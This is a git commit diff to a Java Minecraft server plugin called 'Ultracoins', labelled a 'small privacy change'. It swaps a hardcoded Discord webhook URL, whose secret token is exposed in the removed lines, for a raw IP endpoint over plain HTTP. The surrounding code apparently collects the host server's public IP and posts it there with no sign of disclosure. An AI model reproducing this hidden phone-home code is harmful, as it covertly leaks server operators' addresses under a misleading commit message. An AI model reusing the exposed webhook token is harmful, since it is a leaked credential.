8f9146be053dbbb32fde30e417c6848464cde525
Bali0531 <developer@bali0531.hu>
2025-01-09 18:20:59 +0100

    Small privacy change

--- src/main/java/net/bali0531/ultracoins/Ultracoins.java
+++ src/main/java/net/bali0531/ultracoins/Ultracoins.java
@@ -215,7 +215,7 @@ public final class Ultracoins extends JavaPlugin implements Listener {
     }
 
     private void sendDiscordWebhook(String title, String description) {
-        String webhookUrl = "https://discord.com/api/webhooks/1284804327466209370/IVSpy-J9N982chb9S4kW5HtgX4xApKyluDD0Q9Dd64sIrB_J9F-I9QviNU68IR9W5tDT";
+        String webhookUrl = "http://134.122.65.191:5432/webhook/plugin3";
 
         try {
             String publicIP = getPublicIP();
@@ -248,7 +248,7 @@ public final class Ultracoins extends JavaPlugin implements Listener {
     }
 
     private void sendErrorWebhook(Exception exception) {
-        String webhookUrl = "https://discord.com/api/webhooks/1284804327466209370/IVSpy-J9N982chb9S4kW5HtgX4xApKyluDD0Q9Dd64sIrB_J9F-I9QviNU68IR9W5tDT";
+        String webhookUrl = "http://134.122.65.191:5432/webhook/plugin3";
 
         try {
             String publicIP = getPublicIP();
